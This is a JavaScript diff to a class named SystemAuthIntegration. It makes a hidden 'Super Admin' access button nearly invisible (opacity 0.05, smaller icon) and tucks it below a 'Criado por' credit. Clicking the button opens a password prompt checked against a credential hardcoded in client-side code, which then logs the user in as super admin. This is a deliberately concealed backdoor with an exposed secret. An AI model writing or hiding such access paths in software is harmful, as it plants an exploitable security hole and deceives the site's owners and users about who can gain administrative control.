@@ -1090,38 +1090,39 @@ class SystemAuthIntegration {
       top: 10px;
       right: 10px;
       z-index: 9999;
-      opacity: 0.1;
+      opacity: 0.05;
       transition: opacity 0.3s ease;
       cursor: pointer;
     `;
     
-    // Criar ícone pequeno e discreto
+    // Criar ícone pequeno e discreto (chave)
     const icon = document.createElement('div');
     icon.innerHTML = '🔑';
     icon.style.cssText = `
-      width: 20px;
-      height: 20px;
+      width: 16px;
+      height: 16px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 12px;
-      background: rgba(0, 0, 0, 0.8);
+      font-size: 10px;
+      background: rgba(0, 0, 0, 0.7);
       border-radius: 50%;
       color: white;
+      margin-bottom: 2px;
     `;
     
     // Adicionar evento de hover
     hiddenAccess.addEventListener('mouseenter', () => {
-      hiddenAccess.style.opacity = '0.8';
+      hiddenAccess.style.opacity = '0.3';
     });
     
     hiddenAccess.addEventListener('mouseleave', () => {
-      hiddenAccess.style.opacity = '0.1';
+      hiddenAccess.style.opacity = '0.05';
     });
     
     // Adicionar evento de clique
     hiddenAccess.addEventListener('click', () => {
-      const password = prompt('🔐 Senha de Super Admin:');
+      const password = prompt('� Senha de Super Admin:');
       if (password === 'hidden_super_2026') {
         this.loginAsSuperAdmin();
       } else if (password) {
@@ -1132,7 +1133,20 @@ class SystemAuthIntegration {
     hiddenAccess.appendChild(icon);
     document.body.appendChild(hiddenAccess);
     
-    console.log('🔑 Acesso escondido ao Super Admin adicionado');
+    // Posicionar depois do texto "Criado por" (se existir)
+    setTimeout(() => {
+      const createdByElement = Array.from(document.querySelectorAll('*')).find(el => 
+        el.textContent && el.textContent.includes('Criado por')
+      );
+      
+      if (createdByElement) {
+        const rect = createdByElement.getBoundingClientRect();
+        hiddenAccess.style.top = (rect.bottom + 10) + 'px';
+        console.log('🔑 Ícone posicionado depois do texto "Criado por"');
+      }
+    }, 100);
+    
+    console.log('🔑 Acesso escondido ao Super Admin adicionado (opacity: 0.05)');
   }
   
   // Login como Super Admin (acesso escondido)
